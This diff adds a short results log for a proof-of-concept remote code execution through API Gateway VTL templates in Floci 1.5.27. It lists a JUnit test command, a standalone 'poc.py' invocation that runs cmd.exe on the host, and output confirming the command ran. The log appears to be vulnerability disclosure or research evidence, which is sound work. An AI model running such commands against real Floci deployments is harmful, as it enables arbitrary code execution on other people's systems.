@@ -1,0 +1,23 @@
+Target:
+  Floci 1.5.27
+  Commit 238294e779d0cd24835ba04d7bb16b1e1fd15f76
+
+JUnit E2E command:
+  .\mvnw.cmd '-Denforcer.skip=true' '-Dmaven.compiler.release=21' '-Dmaven.compiler.enablePreview=true' '-DargLine=--enable-preview' '-Dtest=ApiGatewayVtlRceExploitTest' test
+
+JUnit E2E result:
+  Tests run: 1, Failures: 0, Errors: 0, Skipped: 0
+  target\apigw-vtl-rce-marker.txt => FLOCI_APIGW_VTL_RCE
+
+Standalone PoC command:
+  python poc.py --host 127.0.0.1 --port 4566 --argv cmd.exe /c "echo FLOCI_STANDALONE_POC>C:/Temp/floci_standalone_poc.txt"
+
+Standalone PoC result:
+  [+] REST API id: d1e873f2f8
+  [+] Resource id: cfd975b9
+  [+] Trigger response: {"ok":true,"exit":"0"}
+  [+] Command executed by Floci process
+  [+] Cleanup delete REST API: HTTP 202
+  POC_EXIT=0
+  MARKER_EXISTS=True
+  C:\Temp\floci_standalone_poc.txt => FLOCI_STANDALONE_POC
